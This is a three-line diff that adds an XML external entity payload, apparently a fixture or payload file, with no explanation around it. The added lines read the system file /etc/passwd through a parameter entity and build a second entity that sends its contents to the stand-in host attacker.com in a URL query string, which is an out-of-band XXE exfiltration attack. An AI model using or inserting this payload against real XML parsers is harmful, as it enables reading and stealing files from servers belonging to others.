@@ -1,0 +1,3 @@
+<!ENTITY % file_to_read SYSTEM "file:///etc/passwd">
+<!ENTITY % request "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file_to_read;'>">
+%request;
